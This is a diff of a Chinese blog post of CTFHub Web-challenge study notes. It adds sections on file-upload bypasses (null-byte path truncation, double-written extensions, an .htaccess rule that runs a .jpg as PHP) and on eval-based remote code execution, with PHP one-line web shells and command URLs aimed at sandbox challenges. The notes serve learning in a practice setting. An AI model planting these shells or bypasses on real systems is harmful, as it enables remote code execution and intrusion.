@@ -10,7 +10,7 @@
 <meta name="description" content="学习CTFHub的一些记录和备忘，用于日后复习查询" /><meta name="keywords" content='CTFHUB, 信息安全, 网络安全, 笔记' /><meta itemprop="name" content="CTFHub笔记-Web章节">
 <meta itemprop="description" content="学习CTFHub的一些记录和备忘，用于日后复习查询"><meta itemprop="datePublished" content="2023-01-14T11:29:58+08:00" />
 <meta itemprop="dateModified" content="2023-01-14T11:29:58+08:00" />
-<meta itemprop="wordCount" content="3020"><meta itemprop="image" content="https://andreoy.cn/logo.png"/>
+<meta itemprop="wordCount" content="3749"><meta itemprop="image" content="https://andreoy.cn/logo.png"/>
 <meta itemprop="keywords" content="CTFHUB,信息安全,网络安全,笔记," /><meta property="og:title" content="CTFHub笔记-Web章节" />
 <meta property="og:description" content="学习CTFHub的一些记录和备忘，用于日后复习查询" />
 <meta property="og:type" content="article" />
@@ -35,7 +35,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/andreoy.cn\/posts\/ctfhub%E7%AC%94%E8%AE%B0-web\/"
-    },"genre": "posts","keywords": "CTFHUB, 信息安全, 网络安全, 笔记","wordcount":  3020 ,
+    },"genre": "posts","keywords": "CTFHUB, 信息安全, 网络安全, 笔记","wordcount":  3749 ,
     "url": "https:\/\/andreoy.cn\/posts\/ctfhub%E7%AC%94%E8%AE%B0-web\/","datePublished": "2023-01-14T11:29:58+08:00","dateModified": "2023-01-14T11:29:58+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -204,7 +204,7 @@
     alt="Andreo Y."
     title="Andreo Y."/>&nbsp;Andreo Y.</a></span>
           <span class="post-category">收录于 <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 信息安全</a></span></div>
-      <div class="post-meta-line"><span title=2023-01-14&#32;11:29:58><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-14">2023-01-14</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 3020 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 7 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="CTFHub笔记-Web章节">
+      <div class="post-meta-line"><span title=2023-01-14&#32;11:29:58><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-14">2023-01-14</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 3749 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 8 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="CTFHub笔记-Web章节">
               <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
             </span>&nbsp;</div>
     </div><div class="featured-image"><img
@@ -249,6 +249,14 @@
         <li><a href="#前端验证">前端验证</a></li>
         <li><a href="#mime验证">MIME验证</a></li>
         <li><a href="#文件头验证">文件头验证</a></li>
+        <li><a href="#00截断">00截断</a></li>
+        <li><a href="#双写后缀">双写后缀</a></li>
+        <li><a href="#htaccess">.htaccess</a></li>
+      </ul>
+    </li>
+    <li><a href="#rce">RCE</a>
+      <ul>
+        <li><a href="#eval执行">eval执行</a></li>
       </ul>
     </li>
   </ul>
@@ -440,7 +448,9 @@
 <h2 id="文件上传">文件上传</h2>
 <h3 id="无验证">无验证</h3>
 <p>可以用蚁剑，使用shell工具访问木马：<a href="https://writeup.ctfhub.com/Skill/Web/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0/wjpyN7SCVfwf7k2Nq9Q7Gn.html"target="_blank" rel="external nofollow noopener noreferrer">本题WriteUp<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
-<p>但是也可以直接用web shell，将一句话木马写成：</p>
+<p>应用更广泛的小马：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ddf&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>但是也可以直接用web shell，将一句话木马写成：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ddf&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div><p>将php文件上传，然后访问该文件，在文件后加上<code>?ddf=shell指令</code>即可在网页目录中进行操作。依次访问：</p>
 <pre tabindex="0"><code>http://challenge-d97d326c6a3bb91a.sandbox.ctfhub.com:10800/upload/a.php?ddf=ls -a //不在当前目录下
@@ -480,6 +490,40 @@ http://challenge-d97d326c6a3bb91a.sandbox.ctfhub.com:10800/upload/a.php?ddf=cat%
     alt="image-20230118221715778"
     title="image-20230118221715778"/></p>
 <p>上传成功，后续操作同上。</p>
+<h3 id="00截断">00截断</h3>
+<p>先上传一个php，发现并不信；上传一个png，发现也没法访问。也就是并不能直接访问上传的文件。</p>
+<p>将php上传的request发送到repeater，修改filename和存储路径：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/?road=/var/www/html/upload/1.php%00/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Disposition</span><span class="o">:</span> <span class="l">form-data; name=&#34;file&#34;; filename=&#34;a.jpg&#34;</span>
+</span></span></code></pre></div><p><code>%00</code>相当于C++中的<code>\0</code>，即标记了字符串的结尾。文件的存储路径是<code>/var/www/html/upload/1.php%00/a.jpg</code>，但是由于<code>%00</code>处就结束了，所以文件内容被写入了<code>/var/www/html/upload/1.php</code>。</p>
+<p>再访问<code>...:10800/upload/1.php?...</code>即可。此内容有点抽象，希望之后的我还能记得现在的我是怎么理解的。</p>
+<h3 id="双写后缀">双写后缀</h3>
+<p>上传php文件，发现上传成功，但是文件名从<code>a.php</code>变成了<code>a.</code>，说明网页会过滤掉php后缀使之无法执行。</p>
+<p>但是，网页比较傻，只遍历一次字符串。那就把文件名改成<code>a.pphphp</code>，就结束了</p>
+<h3 id="htaccess">.htaccess</h3>
+<p>.htaccess是服务器的一个配置文件，可以实现让某种后缀名的文件在执行时当做另一个后缀名。</p>
+<p>上传写有如下内容的.htaccess文件：</p>
+<pre tabindex="0"><code class="language-htaccess" data-lang="htaccess">&lt;FilesMatch &#34;1.jpg&#34;&gt;
+ SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+</code></pre><p>再上传内容是一句话木马的1.jpg文件，即可用<code>upload/1.jpg?</code>之类的东西搞flag了。</p>
+<h2 id="rce">RCE</h2>
+<h3 id="eval执行">eval执行</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>网页提示当参数是cmd时，执行cmd后的php代码。可以用以下方法运行系统命令：</p>
+<pre tabindex="0"><code>http://challenge-cff24276e86e09e4.sandbox.ctfhub.com:10800/?cmd=system(&#39;系统命令&#39;);
+</code></pre><ul>
+<li>
+<p>find命令</p>
+<p>shell的find命令：<code>find [文件夹] -name [带通配符的文件名]</code>，即可找到在文件夹下的某种名字的文件，对找CTFHub的flag非常有用。</p>
+</li>
+</ul>
 </div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
